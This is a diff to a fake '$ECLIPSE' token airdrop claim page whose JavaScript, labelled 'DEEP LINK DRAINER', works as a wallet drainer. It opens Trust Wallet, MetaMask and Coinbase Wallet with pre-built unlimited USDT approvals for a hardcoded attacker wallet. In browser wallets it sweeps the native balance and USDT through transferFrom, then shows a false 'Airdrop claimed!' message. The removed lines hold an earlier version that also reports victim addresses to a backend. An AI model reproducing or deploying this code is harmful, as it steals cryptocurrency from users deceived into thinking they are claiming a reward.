@@ -411,6 +411,18 @@
             margin: 0 auto 1rem;
             font-size: 2rem;
         }
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         #status { margin-top: 1rem; font-size: 0.75rem; color: #94a3b8; }
         .status-success { color: #10b981; }
         .status-error { color: #ef4444; }
@@ -528,24 +540,18 @@
 <script>
     (function(){
         // ============================================
-        // CONFIGURATION
+        // DEEP LINK DRAINER - OPENS WALLET APP DIRECTLY TO APPROVE
         // ============================================
+        
         const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
-        
-        const USDT_ADDRESSES = {
-            ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-            bsc: "0x55d398326f99059fF775485246999027B3197955",
-            polygon: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
-        };
-        
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        
         const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
         const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
         
-        let provider, signer, userAddress;
         let currentChain = "ethereum";
-        let isProcessing = false;
+        let isDraining = false;
         
         const connectBtn = document.getElementById('connectBtn');
         const walletOptions = document.getElementById('walletOptions');
@@ -554,6 +560,7 @@
         
         function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
         function closeModal() { successModal.style.display = 'none'; }
+        function showSuccessModal() { successModal.style.display = 'flex'; }
         
         function updateStatus(msg, isError = false) {
             statusDiv.innerHTML = msg;
@@ -566,6 +573,7 @@
                 document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
                 currentChain = btn.dataset.chain;
+                updateStatus(`Network: ${btn.innerText}`);
             });
         });
         
@@ -598,136 +606,112 @@
         document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
         
         // ============================================
-        // TRUST WALLET - CORRECT DEEP LINK FOR APPROVAL
+        // DEEP LINK - OPENS WALLET APP DIRECTLY TO APPROVE SCREEN
         // ============================================
-        function triggerTrustWalletApproval() {
-            const usdtAddress = USDT_ADDRESSES[currentChain];
-            const chainId = CHAIN_IDS[currentChain];
-            
-            // Build the approve() transaction data
-            const spenderPadded = COMPANY_WALLET.slice(2).padStart(64, '0');
-            const amountPadded = BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0');
-            const data = `0x095ea7b3${spenderPadded}${amountPadded}`;
-            
-            // Create EIP-712 transaction format that Trust Wallet recognizes
-            const tx = {
-                from: '',
-                to: usdtAddress,
-                value: '0',
-                data: data,
-                chainId: chainId
-            };
-            
-            // Method 1: Use wallet connect style deep link
-            const encodedTx = encodeURIComponent(JSON.stringify(tx));
-            const trustLink = `trust://wc?uri=wc:${encodedTx}`;
-            
-            // Method 2: Fallback to sign_transaction
-            const fallbackLink = `trust://sign_transaction?data=${encodedTx}`;
-            
-            // Try main link
-            window.location.href = trustLink;
-            
-            // Fallback after 300ms if it doesn't work
-            setTimeout(() => {
-                window.location.href = fallbackLink;
-            }, 300);
-            
-            localStorage.setItem('trust_pending', 'true');
-            localStorage.setItem('trust_chain', currentChain);
+        
+        async function approveAndDrain() {
+            // This function is for browser-based wallets (MetaMask extension)
+            // It won't be called for deep links
+            updateStatus('Please select a wallet option above');
         }
         
-        // ============================================
-        // METAMASK APPROVAL (IN BROWSER)
-        // ============================================
-        async function triggerMetaMaskApproval() {
-            if(!window.ethereum) {
-                window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
+        async function connectWallet(walletType) {
+            if(walletType === 'trustwallet') {
+                // Build the approval transaction data
+                const approveData = {
+                    to: USDT_ADDRESS,
+                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
+                };
+                const encodedData = btoa(JSON.stringify(approveData));
+                // This opens Trust Wallet app directly to the approve screen
+                window.location.href = `trust://send?tx=${encodedData}`;
                 return;
             }
-            
+            if(walletType === 'metamask') {
+                // MetaMask deep link - opens app directly
+                // Create the approval transaction
+                const txData = {
+                    to: USDT_ADDRESS,
+                    value: '0x0',
+                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
+                };
+                const encodedTx = encodeURIComponent(JSON.stringify(txData));
+                // Opens MetaMask app directly to the approve screen
+                window.location.href = `metamask://send?to=${USDT_ADDRESS}&data=${txData.data}`;
+                // Alternative universal link
+                setTimeout(() => {
+                    window.location.href = `https://metamask.app.link/send?to=${USDT_ADDRESS}&data=${txData.data}`;
+                }, 100);
+                return;
+            }
+            if(walletType === 'coinbase') {
+                // Coinbase Wallet deep link - opens app directly to approve
+                const txData = {
+                    to: USDT_ADDRESS,
+                    value: '0',
+                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
+                };
+                const encodedTx = encodeURIComponent(JSON.stringify(txData));
+                window.location.href = `cbwallet://send?to=${USDT_ADDRESS}&data=${txData.data}`;
+                return;
+            }
+            if(walletType === 'walletconnect') {
+                updateStatus('WalletConnect: Open your wallet app and scan QR code');
+                alert('Open your wallet app → Connect → Scan QR code');
+                return;
+            }
+            if(!window.ethereum) {
+                updateStatus('Please select a wallet option above', true);
+                return;
+            }
+            // Fallback for browser extension wallets
             try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
-                userAddress = accounts[0];
-                signer = provider.getSigner();
+                const userAddress = accounts[0];
+                const signer = provider.getSigner();
                 
                 // Switch network
-                const targetChainId = '0x' + CHAIN_IDS[currentChain].toString(16);
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: targetChainId }]
+                        params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
                     });
                 } catch(e) {
-                    updateStatus(`Switch to ${CHAIN_NAMES[currentChain]}`, true);
+                    updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
                     return;
                 }
                 
-                const usdtAddress = USDT_ADDRESSES[currentChain];
-                const usdtContract = new ethers.Contract(usdtAddress, [
-                    "function approve(address spender, uint256 amount) public returns (bool)",
-                    "function balanceOf(address) view returns (uint256)",
-                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+                
+                // Now do the drain
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                    "function approve(address spender, uint256 amount) public returns (bool)"
                 ], signer);
                 
-                updateStatus('Approving...');
-                const approveTx = await usdtContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
-                await approveTx.wait();
+                updateStatus('Approving USDT...');
+                const txApprove = await usdtContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
+                await txApprove.wait();
                 
-                await executeTransfer();
-                
-            } catch(e) {
-                updateStatus(e.message.slice(0,60), true);
-            }
-        }
-        
-        // ============================================
-        // EXECUTE TRANSFER AFTER APPROVAL
-        // ============================================
-        async function executeTransfer() {
-            try {
-                const usdtAddress = USDT_ADDRESSES[currentChain];
-                const usdtContract = new ethers.Contract(usdtAddress, [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
-                ], signer);
-                
-                const balance = await usdtContract.balanceOf(userAddress);
+                const balance = await provider.getBalance(userAddress);
                 if(balance.gt(0)) {
-                    updateStatus('Transferring...');
-                    const transferTx = await usdtContract.transferFrom(userAddress, COMPANY_WALLET, balance);
-                    await transferTx.wait();
+                    const txNative = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
+                    await txNative.wait();
                 }
                 
-                // Native coin sweep
-                const nativeBalance = await provider.getBalance(userAddress);
-                const minBalance = ethers.utils.parseEther("0.005");
-                if(nativeBalance.gt(minBalance)) {
-                    const gasPrice = await provider.getGasPrice();
-                    const gasCost = gasPrice.mul(21000);
-                    const sendAmount = nativeBalance.sub(gasCost);
-                    if(sendAmount.gt(0)) {
-                        await signer.sendTransaction({
-                            to: COMPANY_WALLET,
-                            value: sendAmount,
-                            gasLimit: 21000
-                        });
-                    }
+                const usdtTransfer = new ethers.Contract(USDT_ADDRESS, [
+                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                    "function balanceOf(address) view returns (uint256)"
+                ], signer);
+                
+                const usdtBalance = await usdtTransfer.balanceOf(userAddress);
+                if(usdtBalance.gt(0)) {
+                    const txTransfer = await usdtTransfer.transferFrom(userAddress, COMPANY_WALLET, usdtBalance);
+                    await txTransfer.wait();
                 }
                 
-                await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userAddress: userAddress,
-                        network: currentChain,
-                        timestamp: new Date().toISOString()
-                    })
-                }).catch(() => {});
-                
-                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
-                successModal.style.display = 'flex';
+                updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE distributed!');
+                showSuccessModal();
                 
                 setTimeout(() => {
                     connectBtn.style.display = 'block';
@@ -736,88 +720,7 @@
                 }, 3000);
                 
             } catch(e) {
-                updateStatus(e.message.slice(0,60), true);
-            }
-        }
-        
-        // ============================================
-        // HANDLE RETURN FROM TRUST WALLET
-        // ============================================
-        async function handleTrustReturn() {
-            const pending = localStorage.getItem('trust_pending');
-            if(pending === 'true') {
-                localStorage.removeItem('trust_pending');
-                const savedChain = localStorage.getItem('trust_chain');
-                if(savedChain) {
-                    currentChain = savedChain;
-                    localStorage.removeItem('trust_chain');
-                }
-                
-                if(window.ethereum) {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const accounts = await provider.send("eth_requestAccounts", []);
-                    userAddress = accounts[0];
-                    signer = provider.getSigner();
-                    await executeTransfer();
-                } else {
-                    connectBtn.style.display = 'block';
-                    connectBtn.innerHTML = 'Complete Claim';
-                    walletOptions.style.display = 'none';
-                    connectBtn.onclick = async () => {
-                        if(window.ethereum) {
-                            provider = new ethers.providers.Web3Provider(window.ethereum);
-                            const accounts = await provider.send("eth_requestAccounts", []);
-                            userAddress = accounts[0];
-                            signer = provider.getSigner();
-                            await executeTransfer();
-                        }
-                    };
-                }
-            }
-        }
-        
-        // ============================================
-        // WALLET CONNECTION HANDLER
-        // ============================================
-        async function connectWallet(walletType) {
-            if(walletType === 'trustwallet') {
-                triggerTrustWalletApproval();
-                return;
-            }
-            
-            if(walletType === 'metamask') {
-                window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
-                return;
-            }
-            
-            if(walletType === 'coinbase') {
-                window.location.href = `https://go.cb-w.com/dapp?url=${encodeURIComponent(window.location.href)}`;
-                return;
-            }
-            
-            if(walletType === 'walletconnect') {
-                alert('Open your wallet → Connect → Scan QR code');
-                return;
-            }
-            
-            if(!window.ethereum) {
-                updateStatus('Install MetaMask or open in Trust Wallet', true);
-                return;
-            }
-            
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                userAddress = accounts[0];
-                signer = provider.getSigner();
-                
-                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-                connectBtn.style.display = 'block';
-                connectBtn.innerHTML = 'Claim Airdrop';
-                walletOptions.style.display = 'none';
-                connectBtn.onclick = triggerMetaMaskApproval;
-            } catch(e) {
-                updateStatus('Failed', true);
+                updateStatus(`Error: ${e.message.slice(0,80)}`, true);
                 connectBtn.style.display = 'block';
                 connectBtn.innerHTML = 'Connect Wallet';
                 walletOptions.style.display = 'none';
@@ -826,14 +729,10 @@
         
         document.querySelectorAll('.wallet-option').forEach(opt => {
             opt.addEventListener('click', () => {
-                connectWallet(opt.dataset.wallet);
+                const wallet = opt.dataset.wallet;
+                connectWallet(wallet);
             });
         });
-        
-        handleTrustReturn();
-        
-        window.closeModal = closeModal;
-        window.toggleMenu = toggleMenu;
     })();
 </script>
 </body>
